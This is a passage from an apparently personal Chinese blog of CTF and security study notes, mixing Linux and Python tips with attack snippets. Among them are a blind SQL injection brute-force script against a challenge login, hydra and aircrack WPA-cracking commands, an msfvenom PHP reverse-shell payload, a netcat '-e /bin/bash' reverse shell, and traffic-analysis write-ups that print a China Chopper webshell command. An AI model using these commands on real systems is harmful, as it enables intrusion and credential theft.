unescape(encodeURIComponent(key + data))</span></span><br><span class="line"><span class="string">    var strLen = str.length</span></span><br><span class="line"><span class="string">    var wordArray = []</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; strLen - 3; i += 4) &#123;</span></span><br><span class="line"><span class="string">        j = str.charCodeAt(i) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 1) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 2) &lt;&lt; 8 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 3)</span></span><br><span class="line"><span class="string">        wordArray.push(j)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    switch (strLen % 4) &#123;</span></span><br><span class="line"><span class="string">        case 0:</span></span><br><span class="line"><span class="string">            i = 0x080000000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 1:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 2:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 3:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 2) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 1) &lt;&lt;</span></span><br><span class="line"><span class="string">            8 | 0x80</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(i)</span></span><br><span class="line"><span class="string">    while ((wordArray.length % 16) !== 14) &#123;</span></span><br><span class="line"><span class="string">        wordArray.push(0)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(strLen &gt;&gt;&gt; 29)</span></span><br><span class="line"><span class="string">    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)</span></span><br><span class="line"><span class="string">    H0 ^= H5</span></span><br><span class="line"><span class="string">    H1 ^= H5</span></span><br><span class="line"><span class="string">    H2 ^= H5</span></span><br><span class="line"><span class="string">    H3 ^= H5</span></span><br><span class="line"><span class="string">    H4 ^= H5</span></span><br><span class="line"><span class="string">    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) &#123;</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt; 16; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = wordArray[privateKey + i]</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 16; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        A = H0</span></span><br><span class="line"><span class="string">        B = H1</span></span><br><span class="line"><span class="string">        C = H2</span></span><br><span class="line"><span class="string">        D = H3</span></span><br><span class="line"><span class="string">        E = H4</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt;= 19; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 20; i &lt;= 39; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 40; i &lt;= 59; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 60; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        H0 = (H0 + A) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H1 = (H1 + B) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H2 = (H2 + C) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H3 = (H3 + D) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H4 = (H4 + E) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)</span></span><br><span class="line"><span class="string">    return temp.toLowerCase()</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">jsContext = execjs.compile(jsFunc)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://95cfb6e44c614a3e97563689926ccf1d420c63a73b184eed.changame.ichunqiu.com/login.php"</span></span><br><span class="line">string=<span class="string">'!@#$%^&amp;*aM0123456789qwertyuiopsdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBN'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        username = <span class="string">"%s' or ascii(mid(`p@ssw0rd`,%d,1))=%d#"</span> % (<span class="string">''</span>,n,ord(i)) </span><br><span class="line">        password = <span class="string">"111"</span></span><br><span class="line"></span><br><span class="line">        _nonce = jsContext.call(<span class="string">"sign"</span>,username + password, <span class="string">"YTY"</span> + <span class="string">"0Yj"</span> + <span class="string">"M0Y"</span> + <span class="string">"2Rh"</span> + <span class="string">"ZTZ"</span> + <span class="string">"iMj"</span> + <span class="string">"liZ"</span> + <span class="string">"jFj"</span> + <span class="string">"OTQ"</span> + <span class="string">"xOD"</span> + <span class="string">"=="</span>)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'username'</span>:username,</span><br><span class="line">                <span class="string">'password'</span>:password,</span><br><span class="line">                <span class="string">'submit'</span>:<span class="string">''</span>,</span><br><span class="line">                <span class="string">'_nonce'</span>:_nonce</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Incorrect'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="vim比较两个文件的不同之处">vim比较两个文件的不同之处</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vimdiff -o bootstrap.js fakebootstrap.js</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/59158832-170e2600-8af3-11e9-8238-9608a4f08714.png" alt="image"></p>
<h3 id="linux下php版本切换">linux下php版本切换</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set php /usr/bin/php7.0</span><br></pre></td></tr></table></figure>
<h3 id="弱口令爆破">弱口令爆破</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l downfall -P /usr/share/wordlists/rockyou.txt -t 4</span><br><span class="line">cewl -w dc2_passwords.txt http://dc-2</span><br></pre></td></tr></table></figure>
<h3 id="aircrack">aircrack</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo airmon-ng start wlo1</span><br><span class="line">sudo airodump-ng wlo1mon</span><br><span class="line">sudo airodump-ng -w save_file -c 11 --bssid 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line">choose a active user</span><br><span class="line"></span><br><span class="line"> remain the terminal running above and start another.</span><br><span class="line"></span><br><span class="line">sudo aireplay-ng -0 100 -a 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; -c &#123;client_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line"> when there is WPA handshake show in the first terminal , continue.</span><br><span class="line">sudo aircrack-ng -w dict.txt -b &#123;wifi_mac&#125; save_file-01.cap</span><br><span class="line"></span><br><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
<h3 id="msf">msf</h3>
<p>php 文件上传payload生成：</p>
<p><code>sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.20.10.12 LPORT=9991 -f raw &gt; shell.php</code></p>
<p>然后上传shell.php之后。。。</p>
<p>监听并访问：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58418041-39e31800-80b9-11e9-8cd8-efc433d76bfd.png" alt="image"></p>
<h3 id="创建python-虚拟环境">创建python 虚拟环境</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m venv myvenv</span><br><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure>
<h3 id="python-硬链接">python 硬链接</h3>
<p>从一道凯撒加密题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cacer = <span class="string">'ZNK WAOIQ HXUCT LUD PASVY UBKX ZNK RGFE JUM UL IGKYGX GTJ EUAX ATOWAK YURAZOUT OY UVRJGNLYKTKY'</span></span><br><span class="line"></span><br><span class="line">cacer = list(cacer)</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="comment"># 原来写法是cacer_tmp = cacer,但是后来调试的时候发现cacer_tmp改变的时候cacer同时发生了变化,二者之间产生了硬链接</span></span><br><span class="line">    cacer_tmp = [i <span class="keyword">for</span> i <span class="keyword">in</span> cacer]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cacer_tmp)):</span><br><span class="line">        <span class="keyword">if</span> cacer_tmp[i] != <span class="string">' '</span>:</span><br><span class="line">            cacer_tmp[i] = chr((ord(cacer_tmp[i]) - <span class="number">65</span> + offset)%<span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(cacer_tmp).lower()</span><br></pre></td></tr></table></figure>
<h3 id="python调用命令行-getshell">python调用命令行,getshell</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">md5 = os.popen(<span class="string">"python submd5.py "</span>+res_sub_md5+<span class="string">" 0"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"/bin/nc (url) -p 4444 -e /bin/bash"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="获取cookie">获取cookie</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GuestCookie</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    res = session.get(url)</span><br><span class="line">    <span class="keyword">return</span> session.cookies.get_dict()[<span class="string">'user'</span>]</span><br></pre></td></tr></table></figure>
<h3 id="进制转换">进制转换</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串转16进制</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">str=<span class="string">"content"</span></span><br><span class="line"><span class="keyword">print</span> binascii.b2a_hex(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#数字转10进制</span></span><br><span class="line"><span class="keyword">print</span> int(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br><span class="line"><span class="comment">#数字转16进制</span></span><br><span class="line"><span class="keyword">print</span> hex(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="decode">decode</h3>
<p>when we talk about ‘hex’ ‘binary’ …or other things about encode , we are talking about ascii.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57535861-98985a00-7375-11e9-8485-9e86d74e2e0d.png" alt="Screenshot from 2019-05-10 22-46-34"></p>
<h3 id="python3-的编码问题">python3  的编码问题</h3>
<p>因为做密码学课设的缘故, 全组成员统一使用python3来编写代码, 在编写过程中编码是个大问题, 因此在这里做一个备忘</p>
<p>python3中string类型和bytes类型已经明确分开来了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = &apos;1233&apos;</span><br><span class="line">a = u&apos;1233&apos;</span><br></pre></td></tr></table></figure>
<p>这两者是等效的, 都是string类型, 编码是unicode编码, bytes类型如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;\x001233&apos;</span><br></pre></td></tr></table></figure>
<p>每一个bytes都是由八个比特位来表示他的ascii码.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(type(i))</span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
<p>你会发现bytes类型的a中取出单个元素出来, 他的类型会变成int, 而且print的时候也会输出int, 但是如果是切片的话, 截取的结果却还是bytes.</p>
<p>接下来是转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;12334\x00&apos;</span><br><span class="line"># convert bytes to int</span><br><span class="line">b = int.from_bytes(a, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to bytes</span><br><span class="line">c = int.to_bytes(length=6, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to binarry string</span><br><span class="line">d = bin(b)[2:]</span><br><span class="line"># convert binarry string to int</span><br><span class="line">int(d, base=2)</span><br></pre></td></tr></table></figure>
<h2 id="linux">linux</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser ch4ser</span><br><span class="line">adduser ch4ser sudo</span><br></pre></td></tr></table></figure>
<h2 id="关于docker和HyperV无法启动的问题">关于docker和HyperV无法启动的问题</h2>
<ul>
<li>
<p>BIOS 中确定虚拟化功能全部打开</p>
</li>
<li>
<p>windows feature中启动HyperV</p>
</li>
<li>
<p>如果失败尝试以下命令:</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dism.exe /Online /Enable-Feature:Microsoft-Hyper-V /All</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果这个也不行的话</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br><span class="line">然后重启</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以上命令都要用管理员权限运行</p>
</li>
</ul>
<h2 id="切换apache2-的php版本">切换apache2 的php版本</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.0</span><br><span class="line">sudo a2enmod php7.1</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2019/04/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="中国菜刀">中国菜刀</h3>
<p>下载流量包之后追踪tcp流量或者http流量可以在目录中看见flag.tar.gz字段</p>
<p>思路1：binwalk</p>
<p>先把数据包文件拖进kali子系统中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 caidao/</span><br><span class="line">cd caidao/</span><br><span class="line">chmod 777 caidao.pcapng</span><br><span class="line">binwalk -e caidao.pcapng</span><br><span class="line">cd _caidao.pcapng.extracted/</span><br><span class="line">cat 1E43</span><br></pre></td></tr></table></figure>
<p>思路2：wireshark数据包追踪，把一串base64拎出来</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">@ini_set("display_errors","0");</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">if(PHP_VERSION&lt;'5.3.0')</span><br><span class="line">&#123;@set_magic_quotes_runtime(0);&#125;;</span><br><span class="line">echo("X@Y");</span><br><span class="line">$D='C:\\wwwroot\\';</span><br><span class="line">$F=@opendir($D);</span><br><span class="line">if($F==NULL)&#123;echo("ERROR:// Path Not Found Or No Permission!");&#125;</span><br><span class="line">else&#123;$M=NULL;$L=NULL;</span><br><span class="line">while($N=@readdir($F))&#123;$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;&#125;</span><br><span class="line">echo $M.$L;@closedir($F);&#125;;echo("X@Y");die();</span><br></pre></td></tr></table></figure>
<p>当然这没啥用。。</p>
<p>数据包的数据都是在line-based text data里面的</p>
<p>点击line-based text data,右击，点击显示show packet bytes<br>
额。。。把像\301\213\341这样的编码处理一下，之所以start设置为3，是因为前面的开头是x@y，不是base64的东西。。。设置为处理模式为压缩</p>
<h3 id="这么多数据包">这么多数据包</h3>
<p>分析，据说如果是挂木马的话tcp流中会有“command”字段,于是设定过滤规则为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;command&quot;</span><br></pre></td></tr></table></figure>
<p>找出一些tcp包来，然后follow，注意如果是乱码的话可以尝试点一点stream长度，说不定就好了<br>
然后就找到了flag的base64码</p>
<h3 id="手机热点">手机热点</h3>
<p>蓝牙协议的名字叫做obex，所以在wireshark中搜索一下挑出几个包，然后有一个包写着“secret.rar”<br>
导出来，解压得到flag</p>
<h3 id="抓到一只苍蝇">抓到一只苍蝇</h3>
<p>http过滤一下，在第一个数据包中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;fly.rar&quot;,</span><br><span class="line">    &quot;appid&quot;:&quot;&quot;,</span><br><span class="line">    &quot;size&quot;:525701,</span><br><span class="line">    &quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;,</span><br><span class="line">    &quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;,</span><br><span class="line">    &quot;sha3&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现了要传输的文件名字、文件的md5码、文件大小，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>
<p>过滤出来的接下来的5个分片数据包<br>
总长度加起来超过了原文件的数据包大小，原因是附加的文件头。<br>
将这些数据包一个一个导出<br>
然后使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if=1 bs=1 skip=364 of=1.1</span><br><span class="line">#dd命令用于读取、转换、输出数据</span><br><span class="line">cat *.1 &gt; fly.rar</span><br><span class="line">#将这些文件碎片都拼成原始的压缩文件</span><br><span class="line">md5sum fly.rar | grep e023afa4f6579db5becda8fe7861c2d3</span><br><span class="line">#检查MD5码是否匹配</span><br></pre></td></tr></table></figure>
<p>然后用bless打开rar文件，检查加密位，发现是伪加密，因为第一行的73后面的标记位是0000，如果加密就是8000<br>
rar文件头格式介绍：<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p>
<p>把第二行74后面的84改成80就可以了，因为看论文可以知道，这两个字节的值类似于linux中chmod的1、2、4代表三种权限，<br>
最终将所需权限的值相加在一起得到最终的标志位内容</p>
<p>改完之后，解压，打开，发现乱码，改后缀为exe，执行，发现一大堆苍蝇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk flag.txt</span><br><span class="line">#发现很多png图片，尝试使用foremost工具进行文件修复</span><br><span class="line">foremost -v -i flag.txt -o outputfile</span><br><span class="line">#-v 将所有信息输出到屏幕上，-i表示输入文件,-o表示输出目标</span><br></pre></td></tr></table></figure>
<p>打开后有二维码，里头有flag</p>
<h3 id="日志审计">日志审计</h3>
<p>sqlmap二分搜索</p>
<p>观察下面这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] &quot;GET /vulnerabilities/sqli_blind/?id=2&apos; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),24,1))&gt;124 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765 &quot;http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
<p>特征有200响应成功，而且对于每一位来说，最后一次得到200响应匹配的ascii码加上一就是真实的ascii码，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">import</span> urllib</span><br><span class="line"><span class="number">2</span> <span class="keyword">import</span> re</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> ffile=open(<span class="string">'/home/access.log'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="number">5</span> datas=ffile.readlines()</span><br><span class="line"><span class="number">6</span> avalid=[]</span><br><span class="line"><span class="number">7</span> <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line"><span class="number">8</span>     tmp=urllib.unquote(data)</span><br><span class="line"><span class="number">9</span>     <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'COUNT'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'200'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="number">10</span>         avalid.append(tmp)</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> flag_ascii=&#123;&#125;</span><br><span class="line"><span class="number">13</span> <span class="keyword">for</span> segment <span class="keyword">in</span> avalid:</span><br><span class="line"><span class="number">14</span>     checkout=re.search(<span class="string">r'LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND'</span>,segment)</span><br><span class="line">      <span class="comment">#这里(.*?)后面要加AND否则大于号之后的所有内容都被包括进(.*?)中去了</span></span><br><span class="line"><span class="number">15</span>     <span class="keyword">if</span> checkout:</span><br><span class="line"><span class="number">16</span>         key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">17</span>         <span class="keyword">print</span> key</span><br><span class="line"><span class="number">18</span>         <span class="keyword">print</span> checkout.group(<span class="number">2</span>)</span><br><span class="line"><span class="number">19</span>         <span class="keyword">print</span> int(checkout.group(<span class="number">2</span>))</span><br><span class="line"><span class="number">20</span>         value=int(checkout.group(<span class="number">2</span>))+<span class="number">1</span></span><br><span class="line"><span class="number">21</span>         flag_ascii[key]=value  <span class="comment">#同一个key，value在变化直到最后一个</span></span><br><span class="line"><span class="number">23</span> flag=<span class="string">''</span></span><br><span class="line">   <span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">           flag+=chr(value)</span><br><span class="line">   <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h3 id="weblogic">weblogic</h3>
<p>说是要找到被攻击主机的名字。过滤条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;hostname&quot;</span><br></pre></td></tr></table></figure>
<p>然后找一找就行了。。。</p>
<h3 id="信息提取">信息提取</h3>
<p>这道题真的很懵圈。<br>
将wireshark中涉及到盲注的数据包都导出到txt文件中来。<br>
然后python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'/root/kkk.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">lines=f.readlines()</span><br><span class="line">datas=[]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">  tmp=urllib.unquote(line)</span><br><span class="line">  datas.append(tmp)</span><br><span class="line"></span><br><span class="line">flag_ascii=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">  checkout=re.search(<span class="string">r'LIMIT 0,1),(.*?),1\)\)&gt;(.*?) HTTP'</span>,data)</span><br><span class="line">  <span class="keyword">if</span> checkout:</span><br><span class="line">    key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line">    value=int(checkout.group(<span class="number">2</span>))</span><br><span class="line">    flag_ascii[key]=value</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">  flag+=chr(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>但是不知道为什么flag中有的字符是对的有的是错的。</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>密码学笔记[working]</title>
    <url>/2019/09/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="05093ee6bc590169eefc1a694127c50203b685ae2a3214a5a2edf9afc7d54b4d"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>保研政策解读小记[working]</title>
    <url>/2019/09/04/%E4%BF%9D%E7%A0%94%E6%94%BF%E7%AD%96%E8%A7%A3%E8%AF%BB%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="a8d13e815c076af49530150dbbe7e7154aa1fba6a647db488cecbb8614247e42">05d1735931d2533147897dc2f8b22b8dbf5884c5e02c152de5c17e36a6c49f21b401b4df3f3052ab8bc64dc6c4252e3d1f133e1c42cb2efce94864402db3303d9a1db62e7972fc3c6b4f3e2227dfbe36b520a4dc49fd460116d016e73bbafa42c489eb7467de087b9663531762d890a688dfa3acc58e2080f91561d4d49136823e5941c39149c5eeb94f8b4a4459b110ba59a4af7ec774316928e66ec8d1c665cb28024dbd0e2051d515498bc1757ea7c469f5450cca961758553eb504826312a7fcc6ca0158b15b18f6e71a5150c6f13b5ec4723aea4a5bc929ce1e9d0739111e64b6e8ca8f48612e34fd41c1d5199a991cc9bfc6f719c6d7bb326aa179339ebdbaa5143e9b574c955e431894fb2a1edd40ee12d10bc1f5913cd8b2432f869a42d0edf999dd039d8e2f910768b4806445a5d6743243c51994596988905b5f95eebccfd5721ef5b68df993e560b00a062db9e6db00b8d3ff7ee44caabff734681a904737d85427ac77947b24cd9fdc18fd3e53b30947b56c275b3960a88e0352f884b97dffb59c9d5e1def66c5b8baea170c99f8f6580b787655cc3f46ab49ace42826c8792244a3246f1bacc7234ee865d1fef829656ffcd2f9e2f5e9dac8d2a37ffc4c77783a918cda29162bfbf170127000068dfee7ce641283f2b2bfa1801bcdb8fed84a061600f24d0cdbe2e483b7c96e200e67d2b711795ba020e753c090b19951189701d8d6b078221ed4ebeadee085356c